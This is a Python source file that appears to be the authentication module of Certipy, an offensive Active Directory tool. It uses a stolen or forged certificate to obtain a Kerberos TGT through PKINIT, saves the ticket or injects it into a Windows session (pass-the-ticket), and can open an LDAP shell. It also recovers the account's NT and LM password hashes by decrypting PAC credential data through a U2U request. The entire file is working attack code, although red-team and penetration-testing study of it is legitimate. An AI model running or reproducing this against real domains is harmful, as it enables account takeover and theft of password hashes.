import argparse
import base64
import datetime
import os
import platform
import ssl
import sys
import tempfile
from random import getrandbits
from typing import Tuple, Union

import ldap3
from asn1crypto import cms, core
from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.examples.ldap_shell import LdapShell as _LdapShell
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncASRepPart,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from certipy.lib.certificate import (
    cert_id_to_parts,
    cert_to_pem,
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    hash_digest,
    hashes,
    key_to_pem,
    load_pfx,
    rsa,
    x509,
)
from certipy.lib.errors import KRB5_ERROR_MESSAGES
from certipy.lib.logger import logging
from certipy.lib.pkinit import PA_PK_AS_REP, Enctype, KDCDHKeyInfo, build_pkinit_as_req
from certipy.lib.target import Target


class LdapShell(_LdapShell):
    def __init__(self, tcp_shell, domain_dumper, client):
        super().__init__(tcp_shell, domain_dumper, client)

        self.use_rawinput = True
        self.shell = tcp_shell

        self.prompt = "\n# "
        self.tid = None
        self.intro = "Type help for list of commands"
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.client = client
        self.domain_dumper = domain_dumper

    def do_dump(self, line):
        logging.warning("Not implemented")

    def do_exit(self, line):
        print("Bye!")
        return True


class DummyDomainDumper:
    def __init__(self, root: str):
        self.root = root


def truncate_key(value: bytes, keysize: int) -> bytes:
    output = b""
    current_num = 0
    while len(output) < keysize:
        current_digest = hash_digest(bytes([current_num]) + value, hashes.SHA1)
        if len(output) + len(current_digest) > keysize:
            output += current_digest[: keysize - len(output)]
            break
        output += current_digest
        current_num += 1

    return output


class Authenticate:
    def __init__(
        self,
        target: Target = None,
        pfx: str = None,
        cert: x509.Certificate = None,
        key: rsa.RSAPublicKey = None,
        no_save: bool = False,
        no_hash: bool = False,
        ptt: bool = False,
        print: bool = False,
        kirbi: bool = False,
        ldap_shell: bool = False,
        ldap_port: int = 0,
        ldap_scheme: str = "ldaps",
        ldap_user_dn: str = None,
        user_dn: str = None,
        debug=False,
        **kwargs
    ):
        self.target = target
        self.pfx = pfx
        self.cert = cert
        self.key = key
        self.no_save = no_save
        self.no_hash = no_hash
        self.ptt = ptt
        self.print = print
        self.kirbi = kirbi
        self.ldap_shell = ldap_shell
        self.ldap_port = (
            ldap_port if ldap_port != 0 else (389 if ldap_scheme == "ldap" else 636)
        )
        self.ldap_scheme = ldap_scheme
        self.ldap_user_dn = ldap_user_dn
        self.user_dn = user_dn
        self.verbose = debug
        self.kwargs = kwargs

        self.nt_hash: str = None
        self.lm_hash: str = None

        if self.pfx is not None:
            with open(self.pfx, "rb") as f:
                self.key, self.cert = load_pfx(f.read())

    def authenticate(
        self, username: str = None, domain: str = None, is_key_credential=False
    ):
        if username is None:
            username = self.target.username
        if domain is None:
            domain = self.target.domain

        if self.ldap_shell:
            return self.ldap_authentication()

        id_type = None
        identification = None
        object_sid = None
        if not is_key_credential:
            identifications = get_identifications_from_certificate(self.cert)

            if len(identifications) > 1:
                logging.info("Found multiple identifications in certificate")

                while True:
                    logging.info("Please select one:")
                    for i, identification in enumerate(identifications):
                        id_type, id_value = identification
                        print("    [%d] %s: %s" % (i, id_type, repr(id_value)))
                    idx = int(input("> "))

                    if idx >= len(identifications):
                        logging.warning("Invalid index")
                    else:
                        id_type, identification = identifications[idx]
                        break
            elif len(identifications) == 1:
                id_type, identification = identifications[0]
            else:
                id_type, identification = None, None

            cert_username, cert_domain = cert_id_to_parts([(id_type, identification)])

            object_sid = get_object_sid_from_certificate(self.cert)

            if not any([cert_username, cert_domain]):
                logging.warning(
                    "Could not find identification in the provided certificate"
                )

            if not username:
                username = cert_username
            elif cert_username:
                if username.lower() not in [
                    cert_username.lower(),
                    cert_username.lower() + "$",
                ]:
                    logging.warning(
                        (
                            "The provided username does not match the identification "
                            "found in the provided certificate: %s - %s"
                        )
                        % (repr(username), repr(cert_username))
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False

            if not domain:
                domain = cert_domain
            elif cert_domain:
                if (
                    domain.lower() != cert_domain.lower()
                    and not cert_domain.lower().startswith(
                        domain.lower().rstrip(".") + "."
                    )
                ):
                    logging.warning(
                        (
                            "The provided domain does not match the identification "
                            "found in the provided certificate: %s - %s"
                        )
                        % (repr(domain), repr(cert_domain))
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False

        if not all([username, domain]) and not is_key_credential:
            logging.error(
                (
                    "Username or domain is not specified, and identification "
                    "information was not found in the certificate"
                )
            )
            return False

        if not any([len(username), len(domain)]):
            logging.error("Username or domain is invalid: %s@%s" % (username, domain))
            return False

        domain = domain.lower()
        username = username.lower()
        upn = "%s@%s" % (username, domain)

        if self.target.target_ip is None:
            self.target.target_ip = self.target.resolver.resolve(domain)

        logging.info("Using principal: %s" % upn)

        return self.kerberos_authentication(
            username,
            domain,
            is_key_credential,
            id_type,
            identification,
            object_sid,
            upn,
        )

    def ldap_authentication(
        self,
        domain: str = None,
    ) -> Union[str, bool]:
        key_file = tempfile.NamedTemporaryFile(delete=False)
        key_file.write(key_to_pem(self.key))
        key_file.close()

        cert_file = tempfile.NamedTemporaryFile(delete=False)
        cert_file.write(cert_to_pem(self.cert))
        cert_file.close()

        sasl_credentials = None
        if self.ldap_user_dn:
            sasl_credentials = "dn:%s" % self.ldap_user_dn

        tls = ldap3.Tls(
            local_private_key_file=key_file.name,
            local_certificate_file=cert_file.name,
            validate=ssl.CERT_NONE,
            ciphers="ALL:@SECLEVEL=0",
        )

        host = self.target.target_ip
        if host is None:
            host = domain

        logging.info("Connecting to %s" % repr("%s://%s:%d" % (self.ldap_scheme, host, self.ldap_port)))
        ldap_server = ldap3.Server(
            host=host,
            get_info=ldap3.ALL,
            use_ssl=True if self.ldap_scheme == "ldaps" else False,
            port=self.ldap_port,
            tls=tls,
            connect_timeout=self.target.timeout,
        )

        conn_kwargs = dict()
        if self.ldap_scheme == "ldap":
            conn_kwargs = {
                "authentication": ldap3.SASL,
                "sasl_mechanism": ldap3.EXTERNAL,
                "auto_bind": ldap3.AUTO_BIND_TLS_BEFORE_BIND,
                "sasl_credentials": sasl_credentials,
            }

        try:
            ldap_conn = ldap3.Connection(
                ldap_server,
                raise_exceptions=True,
                receive_timeout=self.target.timeout * 10,
                **conn_kwargs
            )
        except ldap3.core.exceptions.LDAPUnavailableResult as e:
            logging.error("LDAP not configured for SSL/TLS connections")
            if self.verbose:
                raise e
            return False

        if self.ldap_scheme == "ldaps":
            ldap_conn.open()

        who_am_i = ldap_conn.extend.standard.who_am_i()
        logging.info(
            "Authenticated to %s as: %s" % (repr(self.target.target_ip), who_am_i)
        )

        root = ldap_server.info.other["defaultNamingContext"][0]
        domain_dumper = DummyDomainDumper(root)
        ldap_shell = LdapShell(sys, domain_dumper, ldap_conn)
        try:
            ldap_shell.cmdloop()
        except KeyboardInterrupt:
            print("Bye!\n")
            pass

        os.unlink(key_file.name)
        os.unlink(cert_file.name)

    def kerberos_authentication(
        self,
        username: str = None,
        domain: str = None,
        is_key_credential: bool = False,
        id_type: str = None,
        identification: str = None,
        object_sid: str = None,
        upn: str = None,
    ) -> Union[str, bool]:
        as_req, diffie = build_pkinit_as_req(username, domain, self.key, self.cert)

        logging.info("Trying to get TGT...")

        try:
            tgt = sendReceive(as_req, domain, self.target.target_ip)
        except KerberosError as e:
            if e.getErrorCode() not in KRB5_ERROR_MESSAGES:
                logging.error("Got unknown Kerberos error: %#x" % e.getErrorCode())
                return False

            if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    ("Name mismatch between certificate and user %s" % repr(username))
                )
                if id_type is not None:
                    logging.error(
                        ("Verify that the username %s matches the certificate %s: %s")
                        % (repr(username), id_type, identification)
                    )
            elif "KDC_ERR_WRONG_REALM" in str(e) and not is_key_credential:
                logging.error(("Wrong domain name specified %s" % repr(domain)))
                if id_type is not None:
                    logging.error(
                        ("Verify that the domain %s matches the certificate %s: %s")
                        % (repr(domain), id_type, identification)
                    )
            elif "KDC_ERR_CERTIFICATE_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    (
                        "Object SID mismatch between certificate and user %s"
                        % repr(username)
                    )
                )
                if object_sid is not None:
                    logging.error(
                        ("Verify that user %s has object SID %s")
                        % (repr(username), repr(object_sid))
                    )
            else:
                logging.error("Got error while trying to request TGT: %s" % str(e))

            return False

        logging.info("Got TGT")

        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        for pa in as_rep["padata"]:
            if pa["padata-type"] == 17:
                pk_as_rep = PA_PK_AS_REP.load(bytes(pa["padata-value"])).native
                break
        else:
            logging.error("PA_PK_AS_REP was not found in AS_REP")
            return False

        ci = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
        sd = ci["content"]
        key_info = sd["encap_content_info"]

        if key_info["content_type"] != "1.3.6.1.5.2.3.2":
            logging.error("Unexpected value for key info content type")
            return False

        auth_data = KDCDHKeyInfo.load(key_info["content"]).native
        pub_key = int(
            "".join(["1"] + [str(x) for x in auth_data["subjectPublicKey"]]), 2
        )
        pub_key = int.from_bytes(
            core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
            "big",
            signed=False,
        )
        shared_key = diffie.exchange(pub_key)

        server_nonce = pk_as_rep["serverDHNonce"]
        full_key = shared_key + diffie.dh_nonce + server_nonce

        etype = as_rep["enc-part"]["etype"]
        cipher = _enctype_table[etype]
        if etype == Enctype.AES256:
            t_key = truncate_key(full_key, 32)
        elif etype == Enctype.AES128:
            t_key = truncate_key(full_key, 16)
        else:
            logging.error("Unexpected encryption type in AS_REP")
            return False

        key = Key(cipher.enctype, t_key)
        enc_data = as_rep["enc-part"]["cipher"]
        dec_data = cipher.decrypt(key, 3, enc_data)
        enc_as_rep_part = decoder.decode(dec_data, asn1Spec=EncASRepPart())[0]

        cipher = _enctype_table[int(enc_as_rep_part["key"]["keytype"])]
        session_key = Key(cipher.enctype, bytes(enc_as_rep_part["key"]["keyvalue"]))

        ccache = CCache()
        ccache.fromTGT(tgt, key, None)
        krb_cred = ccache.toKRBCRED()

        if self.print:
            logging.info("Ticket:")
            print(base64.b64encode(krb_cred).decode())

        if not self.no_save or self.ptt:
            if not self.no_save:
                if self.kirbi:
                    kirbi_name = "%s.kirbi" % username.rstrip("$")
                    ccache.saveKirbiFile(kirbi_name)
                    logging.info("Saved Kirbi file to %s" % repr(kirbi_name))
                else:
                    self.ccache_name = "%s.ccache" % username.rstrip("$")
                    ccache.saveFile(self.ccache_name)
                    logging.info(
                        "Saved credential cache to %s" % repr(self.ccache_name)
                    )

            if self.ptt:
                krb_cred = ccache.toKRBCRED()
                logging.info("Trying to inject ticket into session")

                if platform.system().lower() != "windows":
                    logging.error("Not running on Windows platform. Aborting")
                else:
                    try:
                        from certipy.lib import sspi

                        res = sspi.submit_ticket(krb_cred)
                        if res:
                            logging.info("Successfully injected ticket into session")
                    except Exception as e:
                        logging.error(
                            "Failed to inject ticket into session: %s" % str(e)
                        )

        if not self.no_hash:
            logging.info("Trying to retrieve NT hash for %s" % repr(username))

            # Try to extract NT hash via U2U
            # https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
            # AP_REQ
            ap_req = AP_REQ()
            ap_req["pvno"] = 5
            ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = []
            ap_req["ap-options"] = constants.encodeFlags(opts)

            ticket = Ticket()
            ticket.from_asn1(as_rep["ticket"])

            seq_set(ap_req, "ticket", ticket.to_asn1)

            authenticator = Authenticator()
            authenticator["authenticator-vno"] = 5

            authenticator["crealm"] = bytes(as_rep["crealm"])

            client_name = Principal()
            client_name.from_asn1(as_rep, "crealm", "cname")

            seq_set(authenticator, "cname", client_name.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator["cusec"] = now.microsecond
            authenticator["ctime"] = KerberosTime.to_asn1(now)

            encoded_authenticator = encoder.encode(authenticator)

            encrypted_encoded_authenticator = cipher.encrypt(
                session_key, 7, encoded_authenticator, None
            )

            ap_req["authenticator"] = noValue
            ap_req["authenticator"]["etype"] = cipher.enctype
            ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator

            encoded_ap_req = encoder.encode(ap_req)

            # TGS_REQ
            tgs_req = TGS_REQ()

            tgs_req["pvno"] = 5
            tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

            tgs_req["padata"] = noValue
            tgs_req["padata"][0] = noValue
            tgs_req["padata"][0]["padata-type"] = int(
                constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
            )
            tgs_req["padata"][0]["padata-value"] = encoded_ap_req

            req_body = seq_set(tgs_req, "req-body")

            opts = []
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable_ok.value)

            req_body["kdc-options"] = constants.encodeFlags(opts)

            server_name = Principal(
                username, type=constants.PrincipalNameType.NT_UNKNOWN.value
            )

            seq_set(req_body, "sname", server_name.components_to_asn1)

            req_body["realm"] = str(as_rep["crealm"])

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            req_body["till"] = KerberosTime.to_asn1(now)
            req_body["nonce"] = getrandbits(31)
            seq_set_iter(
                req_body,
                "etype",
                (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
            )

            ticket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(req_body, "additional-tickets", (ticket,))
            message = encoder.encode(tgs_req)

            tgs = sendReceive(message, domain, self.target.target_ip)

            tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            ciphertext = tgs["ticket"]["enc-part"]["cipher"]

            new_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]

            plaintext = new_cipher.decrypt(session_key, 2, ciphertext)
            special_key = Key(18, t_key)

            data = plaintext
            enc_ticket_part = decoder.decode(data, asn1Spec=EncTicketPart())[0]
            ad_if_relevant = decoder.decode(
                enc_ticket_part["authorization-data"][0]["ad-data"],
                asn1Spec=AD_IF_RELEVANT(),
            )[0]
            pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
            buff = pac_type["Buffers"]

            nt_hash = None
            lm_hash = "aad3b435b51404eeaad3b435b51404ee"

            for _ in range(pac_type["cBuffers"]):
                info_buffer = PAC_INFO_BUFFER(buff)
                data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
                    : info_buffer["cbBufferSize"]
                ]
                if info_buffer["ulType"] == 2:
                    cred_info = PAC_CREDENTIAL_INFO(data)
                    new_cipher = _enctype_table[cred_info["EncryptionType"]]
                    out = new_cipher.decrypt(
                        special_key, 16, cred_info["SerializedData"]
                    )
                    type1 = TypeSerialization1(out)
                    new_data = out[len(type1) + 4 :]
                    pcc = PAC_CREDENTIAL_DATA(new_data)
                    for cred in pcc["Credentials"]:
                        cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                            b"".join(cred["Credentials"])
                        )
                        if any(cred_structs["LmPassword"]):
                            lm_hash = cred_structs["LmPassword"].hex()
                        nt_hash = cred_structs["NtPassword"].hex()
                        break
                    break

                buff = buff[len(info_buffer) :]
            else:
                logging.error("Could not find credentials in PAC")
                return False

            self.lm_hash = lm_hash
            self.nt_hash = nt_hash

            if not is_key_credential:
                logging.info("Got hash for %s: %s:%s", repr(upn), lm_hash, nt_hash)

            return nt_hash

        return False


def entry(options: argparse.Namespace) -> None:
    options.no_pass = True
    target = Target.create(
        domain=options.domain,
        username=options.username,
        dc_ip=options.dc_ip,
        target_ip=options.dc_ip,
        ns=options.ns,
        timeout=options.timeout,
        dns_tcp=options.dns_tcp,
        no_pass=True,
    )

    authenticate = Authenticate(target=target, **vars(options))
    authenticate.authenticate()
